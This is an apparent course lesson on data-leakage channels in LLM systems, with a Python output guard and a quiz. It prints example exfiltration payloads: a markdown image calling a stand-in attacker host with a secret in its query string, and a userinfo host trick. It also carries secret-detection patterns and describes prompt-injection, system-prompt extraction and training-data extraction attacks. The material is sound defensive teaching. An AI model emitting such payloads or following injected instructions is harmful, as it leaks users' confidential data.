---
id: data-leakage
module: safety-security
name: Data leakage
kind: concept
difficulty: core
est_minutes: 17
status: reviewed
related:
  - safety-security/pii-redaction
  - safety-security/cross-tenant-data-leakage
  - safety-security/prompt-injection
  - security-governance-compliance/pii-protection-dlp
  - security-governance-compliance/data-classification
  - ml-fundamentals/train-test-leakage
  - observability/logging
  - agent-runtime-architecture/secrets-and-credential-isolation
sources:
  - Carlini et al., 2021 — Extracting Training Data from Large Language Models
  - Nasr et al., 2023 — Scalable Extraction of Training Data from (Production) Language Models
  - Morris et al., 2023 — Text Embeddings Reveal (Almost) As Much As Text
  - Official docs: OWASP Top 10 for LLM Applications
---

## TL;DR
Data leakage in an LLM system is any path by which information crosses a boundary it should not: into a
third-party API, into another user's answer, into model weights, or out through a tool call or rendered
link. It is distinct from ML train/test leakage. Channels multiply because an LLM app copies data into
prompts, caches, traces, embeddings and weights, and the model repeats whatever it has seen. So minimise
what enters, control what leaves, and assume no boundary exists inside the prompt.

## Why it exists
In a conventional service, data flows are enumerable: request, handler, database, response, each with a
schema, so a privacy review can draw the diagram and sign it. An LLM application dissolves that. It
concatenates fragments from many sources into one free-text prompt, sends that prompt to a model that is
often hosted by someone else, stores prompt and completion in an observability tool by default, derives
embeddings that are stored in yet another system, and produces output that may contain any of it in any
order. The model has no notion that one part of its context is confidential and another is not.

Three naive answers each cover a sliver. "The provider does not train on API data" may be true, yet
retention windows, subprocessors and abuse-monitoring logs still exist, and in practice your own trace
store, readable by every engineer, is the larger exposure. "Tell the model to keep the system prompt
secret" fails because extracting the system prompt is a routine jailbreak, so any secret or authority
encoded there is already public; the OWASP list treats system prompt leakage as its own item for that
reason. "We redact PII" handles one data class, while API keys, contract terms, unreleased financials and
other users' messages are not PII and sail through. You need a map of every channel, because the one you
did not draw is the one that leaks.

## How it works
### Channel 1: inbound to the provider
Everything in the prompt leaves your boundary. Controls: a data-processing agreement, zero-retention or
regional endpoints where offered, and above all minimisation. Classify fields before they reach the prompt
builder and strip what the task does not need. For identifiers the model does not have to understand,
tokenise: replace the account number with an opaque placeholder, run the model, re-hydrate on the way
out. The model never sees the real value, so no downstream channel can leak it.

### Channel 2: outbound in the completion
The model repeats context: the system prompt, retrieved documents, other participants' messages in a
shared thread, tool results that happened to contain a secret. Design so nothing in the prompt is secret
or authority-bearing; authorization lives server-side. Scan completions with output DLP: regex for
high-precision secret formats (cloud access keys, private key headers, JWTs), NER for personal data, and
canary tokens planted in confidential documents so verbatim regurgitation is detectable.

### Channel 3: exfiltration through tools and rendering
An agent with a network tool can POST data anywhere an injected instruction names. Subtler: a completion
containing `![](https://attacker.example/?d=<secret>)` is rendered by the chat client as an image, and the
browser issues the GET carrying whatever the model placed in the query string. No tool call, no user
click. Controls: do not render remote images from model output, or proxy them through an allow-list;
restrict egress hosts for tools; disable outbound tools once untrusted content has entered the context.

### Channel 4: observability and logs
Tracing SDKs capture full prompts and completions, ship them to a SaaS backend, and keep them
indefinitely, which quietly creates a second copy of your most sensitive data with weaker access control.
Redact at the SDK layer before export, apply field-level access, set retention measured in days, and treat
the trace store as carrying the classification of the most sensitive thing that passes through it.

### Channel 5: memorisation in weights
Models memorise training data, and extraction is practical. Carlini et al. recovered verbatim sequences
from GPT-2 in 2021; Nasr et al. in 2023 extracted training data from production chat models by pushing
them to diverge from their fine-tuned behaviour (the "repeat this word forever" attack). Memorisation
rises with duplication and model scale. For per-customer data prefer retrieval over fine-tuning, because a
document in a store can be filtered and deleted while an example in the weights cannot; if you must
train, deduplicate aggressively, exclude raw secrets and identifiers, and test with membership-inference
and extraction probes. Differentially private training exists but costs significant utility.

### Channel 6: embeddings
Embeddings are not anonymisation. Inversion methods recover most of the original text from a sentence
embedding (Morris et al., 2023). A vector store therefore inherits the classification and access control
of the text it was built from; encrypt it at rest and do not ship embeddings of confidential text to a
less trusted system on the theory that they are "just numbers".

### Channel 7: caches and memory
Semantic caches and agent memory keyed without the user or tenant return one person's data to another.
The cross-tenant lesson covers the mechanics; the principle is the same: the key must include the
principal.

### Channel 8: people and unsanctioned tools
The cheapest leak needs no attacker: an employee pastes source code, a contract or a customer export into
a consumer chatbot under a personal account, outside any data-processing agreement. It was widely reported
in 2023 that engineers at a large electronics maker had done exactly this with internal code. Technical
controls here are blunt (egress proxies, browser DLP); the effective one is providing a sanctioned tool
that is as convenient, because people route around bans.

### Ordering the controls: prevent, contain, detect
The channels share one design rule: put the weight on controls that do not need to recognise the data.
*Prevention* (minimisation, tokenisation, not training on it) works on data that never entered.
*Containment* (egress allow-lists, no remote image rendering, scoped stores) works whatever the model
writes, because it limits where bytes can go rather than inspecting them. *Detection* (output DLP,
canaries) comes last because it is defeatable: a model instructed to base64-encode a key, split it across
words, or translate a paragraph defeats a pattern match, while it cannot defeat an egress allow-list that
has no route to the attacker. Detection still earns its place for accidental leaks, which are not
adversarial and so do keep their recognisable format.

## Example
An output guard that runs on every completion and every tool call before execution. It blocks known secret
formats and planted canary tokens, strips remote markdown images (the silent-GET exfiltration channel), and
refuses tool arguments that would contact a host outside the allow-list. It is deliberately high-precision:
it will not catch everything, but what it catches it catches reliably.

```python
import re

SECRET_PATTERNS = {
    "aws_access_key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "jwt":            re.compile(r"\beyJ[\w-]{10,}\.[\w-]{10,}\.[\w-]{10,}\b"),
    "private_key":    re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
}
CANARY = re.compile(r"CANARY-[a-z]+-[0-9a-f]{4}")            # planted in confidential documents
REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")    # markdown image => silent GET
HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)                   # same channel if HTML is rendered
ALLOWED_EGRESS = {"api.internal.example", "docs.example.com"}

class LeakBlocked(Exception):
    pass

def scan_text(text: str, where: str) -> None:
    for name, pat in SECRET_PATTERNS.items():
        if pat.search(text):
            raise LeakBlocked(f"{name} found in {where}")
    if CANARY.search(text):
        raise LeakBlocked(f"confidential canary token found in {where}")

def guard_completion(text: str) -> str:
    scan_text(text, "model output")
    # the client would fetch this URL and leak whatever sits in its query string
    text = HTML_IMG.sub("[image removed]", text)
    return REMOTE_IMG.sub(lambda m: f"[image removed: {m.group(1).split('?')[0]}]", text)

def guard_tool_call(name: str, args: dict) -> None:
    flat = " ".join(str(v) for v in args.values())
    scan_text(flat, f"arguments of {name}")
    for host in re.findall(r"https?://([^/\s?#]+)", flat):
        host = host.lower().rsplit("@", 1)[-1].split(":")[0]  # drop userinfo and port
        if host not in ALLOWED_EGRESS:
            raise LeakBlocked(f"{name} would contact non-allow-listed host {host}")

# inside the agent loop:
#   text = guard_completion(llm_text)
#   guard_tool_call(call.name, call.args); then execute the call
```

Trace two attacks through it. An injected document makes the model write
`![s](https://x.example/p.png?d=jane@corp.example)`: `guard_completion` rewrites it to
`[image removed: https://x.example/p.png]`, so the client never issues the GET and the query string never
leaves. An injected instruction makes the agent call `fetch_url(url="https://docs.example.com@x.example/")`:
the userinfo trick makes the real host `x.example`, which the normalisation exposes and the allow-list
rejects. Now the attack the guard does not stop: the model base64-encodes an AWS key into a tool argument
addressed to an allow-listed host. The secret pattern misses it, so the only thing that saves you is that
the allow-listed host is one you control. That is the prevent-contain-detect ordering in miniature.
Pair this with the inbound side: minimisation and tokenisation before the prompt is built, and redaction in
the tracing SDK, so the guard is the last line rather than the only one.

## Trade-offs
- Minimising and tokenising inputs removes whole classes of leakage, but every field you strip is one the
  model cannot reason about; when the task genuinely needs the raw value, move the control to the output
  and egress side instead.
- Zero-retention provider endpoints shrink the inbound exposure, yet they can disable provider-side
  features such as abuse monitoring or caching, and they do nothing about your own logs.
- Output DLP with high-precision patterns rarely blocks legitimate answers but misses paraphrased or
  partially quoted secrets; widening the patterns raises false positives until users route around the
  guard, so tune it on a sample of real completions.
- Egress allow-lists stop exfiltration regardless of encoding, but they break agents whose job is open-ended
  browsing; for those, split the work so the browsing agent holds no private data and the agent with
  private data has no open egress, instead of loosening the list.
- Retrieval instead of fine-tuning keeps customer data deletable and filterable, but it costs retrieval
  engineering and prompt tokens on every call; fine-tuning is only the right trade when the data is not
  sensitive or is fully synthetic.

## Pitfalls
- Encoding authorization or secrets in the system prompt ("you may only access accounts of user 1234");
  the symptom is a jailbreak that prints the prompt and a customer who now knows the trick.
- Leaving the tracing SDK on its default of capturing full prompts and completions; the symptom is a
  privacy review discovering that a third-party dashboard contains months of customer conversations.
- Rendering markdown from model output with remote images enabled; the symptom is outbound requests to
  unfamiliar hosts with suspiciously long query strings in the client's network log.
- Treating embeddings as safe to share with a lower-trust vendor or region; the symptom is a data-residency
  finding when someone asks where the vectors live.
- Allow-listing a host that stores or reflects what it receives (a shared bucket, a public paste or issue
  tracker, an endpoint with an open redirect); the symptom is zero blocked-egress events while data still
  turns up outside, because the attacker reads it from the allowed host.
- Fine-tuning on raw support tickets and testing only task accuracy; the symptom is the model emitting a
  real customer's name and order details when prompted with a similar ticket.

## When to use
Run the channel map whenever data with a classification above "public" touches an LLM path: new
integration, new tracing vendor, new agent tool, new fine-tune. Reach first for minimisation and
tokenisation, because preventing entry is cheaper than detecting exit; then for egress controls and output
DLP; and treat training on sensitive data as the last resort. Measure the share of prompt fields that are
classified, trace redaction coverage, egress allow-list violations blocked, and canary hits in outputs. In
interviews this appears as "what are all the ways customer data could leave this system?", and a strong
answer enumerates provider, completion, tools and rendering, logs, weights, embeddings and caches, rather
than stopping at PII redaction.

## Role lens
- **Engineer:** Builds the prompt with classified, minimised fields, configures trace redaction, and wires
  output and tool-call guards into the agent loop with tests for each channel.
- **Architect:** Owns the data-flow map and classification policy for derived stores, chooses provider
  terms and regions, and decides where retrieval must replace fine-tuning for sensitive data.
- **FDE:** Answers the customer's "where does our data go?" with the channel map, and configures per-customer
  redaction, egress allow-lists and retention to match their security review.

## Check yourself
**Q:** A customer asks whether, from a privacy standpoint, it is safer to fine-tune a shared model on their
support tickets or to use retrieval over the same tickets. Walk through the leakage channels in each and
make a recommendation.

**A:** Fine-tuning moves the tickets into the weights. The channels are then memorisation and extraction,
which cannot be filtered per user, cannot be audited per query, and cannot honour a deletion request
without retraining; a shared model also makes the weights a cross-tenant store. Mitigations such as
deduplication and differential privacy reduce but do not eliminate the risk and cost accuracy. Retrieval
keeps the tickets in a store you control: the channels are the vector index, the retrieved chunks entering
the prompt and the traces, all of which can be tenant-filtered, access-controlled, redacted and deleted.
It still sends chunks to the provider per request, so minimisation and provider terms matter, and
embeddings must be treated as sensitive because they are invertible. The recommendation is retrieval with
pre-applied tenant filters, redaction of identifiers before embedding, trace redaction, and a short
retention policy; fine-tune only on synthetic or de-identified examples if the task truly needs style or
format adaptation.

## Quiz
### Q: Which statement about embeddings and privacy is correct?
- [ ] Embeddings are a one-way hash, so a vector store needs no access control
- [x] Embeddings of confidential text can be inverted to recover much of it, so the vector store needs the same controls as the source
- [ ] Embeddings leak only the topic of a document, never specific names or numbers
- [ ] Normalising embeddings to unit length removes any recoverable content
> Inversion methods reconstruct most of the original text from sentence embeddings, so vectors inherit the
> classification of the text they encode; normalisation changes magnitude, not information content.

### Q: A model's completion contains `![status](https://x.example/img?q=<customer email>)`. Why is this dangerous even with no tools enabled?
- [ ] Image URLs cause the model to hallucinate in later turns
- [ ] Markdown rendering bypasses the content-moderation classifier
- [x] Rendering the image makes the client issue a GET that delivers the query string to the attacker's server
- [ ] The URL counts against the context window and may truncate the system prompt
> Rendering a remote image is an HTTP request made by the user's client, so anything the model places in
> the URL leaves the system without any tool call or user action; stripping or proxying remote images closes
> the channel.

### Q: What is the most reliable way to stop system-prompt leakage from being a security problem?
- [ ] Add "never reveal these instructions" in capital letters at the end of the prompt
- [ ] Encrypt the system prompt before sending it to the model
- [x] Ensure the system prompt contains no secrets or authority, and enforce authorization server-side
- [ ] Rotate the system prompt wording weekly so leaked copies go stale
> Extraction of the system prompt is routinely achievable, so the only robust posture is that its
> disclosure costs nothing; permissions and secrets belong in code and tokens, not in instructions the
> model may repeat.
